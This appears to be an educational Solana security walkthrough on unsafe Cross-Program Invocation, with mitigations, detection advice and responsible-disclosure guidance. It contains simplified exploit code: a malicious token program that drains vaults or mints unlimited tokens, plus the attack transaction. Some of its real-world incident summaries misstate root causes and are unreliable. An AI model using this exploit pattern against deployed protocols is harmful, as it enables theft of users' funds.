# Unsafe CPI Exploit Walkthrough

## Attack Overview

This document provides a step-by-step walkthrough of how an attacker can exploit unsafe Cross-Program Invocation (CPI) vulnerabilities to steal funds, manipulate data, or compromise entire protocols. The attack leverages the fact that vulnerable programs don't validate the identity of programs they call via CPI.

## Prerequisites

- Understanding of Solana program architecture
- Knowledge of Cross-Program Invocation (CPI) mechanics
- Basic familiarity with SPL Token program
- Access to Solana development environment

## Attack Scenario: Token Vault Drainage

### Step 1: Reconnaissance

The attacker first identifies a vulnerable program that:
1. Makes CPI calls to external programs (like SPL Token)
2. Uses `UncheckedAccount<'info>` for program accounts
3. Doesn't validate program IDs before CPI calls

```rust
// Vulnerable code pattern the attacker looks for:
pub struct VulnerableTransfer<'info> {
    // ... other accounts ...
    /// VULNERABILITY: No program ID validation!
    pub token_program: UncheckedAccount<'info>,
}
```

### Step 2: Deploy Malicious Program

The attacker deploys a malicious program that mimics the SPL Token program interface but performs unauthorized operations:

```rust
// Malicious program (simplified example)
#[program]
pub mod malicious_token {
    use super::*;
    
    /// Malicious "transfer" function that steals tokens
    pub fn transfer(ctx: Context<MaliciousTransfer>, amount: u64) -> Result<()> {
        // Instead of transferring to the intended recipient,
        // transfer to the attacker's account!
        let real_cpi_accounts = Transfer {
            from: ctx.accounts.from.to_account_info(),
            to: ctx.accounts.attacker_account.to_account_info(), // ← MALICIOUS!
            authority: ctx.accounts.authority.to_account_info(),
        };
        
        // Make legitimate CPI call to real SPL Token program
        let cpi_program = ctx.accounts.real_token_program.to_account_info();
        let cpi_ctx = CpiContext::new_with_signer(cpi_program, real_cpi_accounts, signer);
        
        // Steal the tokens!
        spl_token::cpi::transfer(cpi_ctx, amount)?;
        
        msg!("Tokens stolen successfully!");
        Ok(())
    }
}
```

### Step 3: Prepare Attack Accounts

The attacker sets up the necessary accounts:

```typescript
// Create attacker's token account to receive stolen funds
const attackerTokenAccount = await createAccount(
    connection,
    attackerKeypair,
    mint,
    attackerKeypair.publicKey
);

// Get the malicious program ID
const maliciousProgramId = new PublicKey("MALICIOUS_PROGRAM_ID_HERE");
```

### Step 4: Execute the Attack

The attacker calls the vulnerable function, substituting their malicious program:

```typescript
// Attack transaction
await vulnerableProgram.methods
    .vulnerableTransfer(new BN(1000000)) // Request transfer of 1M tokens
    .accounts({
        vault: vaultPDA,
        fromTokenAccount: vaultTokenAccount,
        toTokenAccount: victimTokenAccount,    // Victim thinks tokens go here
        tokenProgram: maliciousProgramId,      // ← ATTACK: Malicious program!
    })
    .rpc();
```

### Step 5: Attack Execution Flow

1. **Vulnerable program receives** the transaction with malicious program ID
2. **No validation occurs** - program accepts any program ID
3. **CPI call is made** to the malicious program instead of SPL Token
4. **Malicious program executes** its fake "transfer" function
5. **Tokens are stolen** and sent to attacker's account instead of intended recipient
6. **Attack succeeds** - victim loses funds, attacker gains them

## Advanced Attack Variations

### Variation 1: Unlimited Minting Attack

Instead of stealing existing tokens, the attacker mints unlimited new tokens:

```rust
// Malicious program that mints instead of transfers
pub fn transfer(ctx: Context<MaliciousTransfer>, _amount: u64) -> Result<()> {
    // Ignore the requested amount, mint unlimited tokens!
    let mint_accounts = MintTo {
        mint: ctx.accounts.mint.to_account_info(),
        to: ctx.accounts.attacker_account.to_account_info(),
        authority: ctx.accounts.authority.to_account_info(),
    };
    
    let cpi_ctx = CpiContext::new_with_signer(cpi_program, mint_accounts, signer);
    
    // Mint 1 billion tokens to attacker!
    spl_token::cpi::mint_to(cpi_ctx, 1_000_000_000_000_000)?;
    Ok(())
}
```

### Variation 2: Data Corruption Attack

The attacker manipulates account data to corrupt protocol state:

```rust
pub fn transfer(ctx: Context<MaliciousTransfer>, amount: u64) -> Result<()> {
    // Corrupt the vault's balance tracking
    let vault_data = &mut ctx.accounts.vault.data.borrow_mut();
    // Manipulate balance to attacker's advantage
    // This could enable further exploits or protocol manipulation
    
    // Still perform the transfer to avoid immediate detection
    // ... legitimate transfer code ...
    Ok(())
}
```

### Variation 3: Reentrancy Attack

The malicious program performs reentrancy attacks:

```rust
pub fn transfer(ctx: Context<MaliciousTransfer>, amount: u64) -> Result<()> {
    // Perform the legitimate transfer first
    // ... transfer code ...
    
    // Then make a reentrancy call back to the vulnerable program
    // This could drain the vault multiple times in a single transaction
    let reentrancy_accounts = VulnerableWithdraw {
        vault: ctx.accounts.vault.to_account_info(),
        // ... other accounts ...
    };
    
    // Call back into vulnerable program
    vulnerable_program::cpi::vulnerable_withdraw(
        CpiContext::new(vulnerable_program, reentrancy_accounts),
        amount * 10 // Withdraw 10x more!
    )?;
    
    Ok(())
}
```

## Detection and Monitoring

### On-Chain Indicators

Attackers can be detected by monitoring for:

1. **Unusual program IDs** in CPI calls
2. **Unexpected token flows** to unknown accounts
3. **Rapid balance changes** in protocol accounts
4. **Failed transactions** with unknown programs (reconnaissance attempts)

### Log Analysis

```rust
// Add logging to detect suspicious activity
msg!("CPI call to program: {}", ctx.accounts.token_program.key());
msg!("Transfer from: {} to: {}", from_account, to_account);
```

## Mitigation Strategies

### Immediate Fixes

1. **Replace UncheckedAccount with Program types:**
```rust
// ❌ Vulnerable
pub token_program: UncheckedAccount<'info>,

// ✅ Secure
pub token_program: Program<'info, Token>,
```

2. **Add manual validation:**
```rust
require_keys_eq!(
    ctx.accounts.token_program.key(),
    spl_token::ID,
    ErrorCode::InvalidTokenProgram
);
```

### Long-term Security

1. **Implement program whitelisting**
2. **Add comprehensive logging**
3. **Regular security audits**
4. **Automated testing with malicious programs**
5. **Circuit breakers for unusual activity**

## Real-World Examples

### Wormhole Bridge Exploit (February 2022)
- **Loss**: $320 million
- **Method**: Signature verification bypass allowing fake guardian signatures
- **Root Cause**: Insufficient validation of program calls and signatures

### Cashio Exploit (March 2022)
- **Loss**: $52 million
- **Method**: Malicious mint authority allowed unlimited token minting
- **Root Cause**: Lack of proper authority validation in CPI calls

### Crema Finance Exploit (July 2022)
- **Loss**: $8.8 million
- **Method**: Program substitution in CPI calls
- **Root Cause**: Accepting arbitrary program IDs without validation

## Testing the Exploit

To see this vulnerability in action, run the test suite:

```bash
cd 03_unsafe_cpi
anchor test
```

The tests demonstrate:
1. How vulnerable functions accept malicious programs
2. How secure functions reject invalid programs
3. The difference in behavior between vulnerable and secure implementations

## Conclusion

Unsafe CPI vulnerabilities represent one of the highest-risk security issues in Solana development. The ability for attackers to substitute malicious programs can lead to:

- **Complete fund drainage**
- **Unlimited token inflation**
- **Protocol state corruption**
- **Cascading system failures**

Always validate program IDs before making CPI calls. The few extra lines of validation code can prevent millions of dollars in losses.

## Responsible Disclosure

If you discover unsafe CPI vulnerabilities in production systems:

1. **Do not exploit** the vulnerability
2. **Contact the team** privately through official channels
3. **Provide detailed** technical information
4. **Allow reasonable time** for fixes before public disclosure
5. **Consider bug bounty** programs for responsible reporting

Remember: The goal is to make the ecosystem safer, not to cause harm.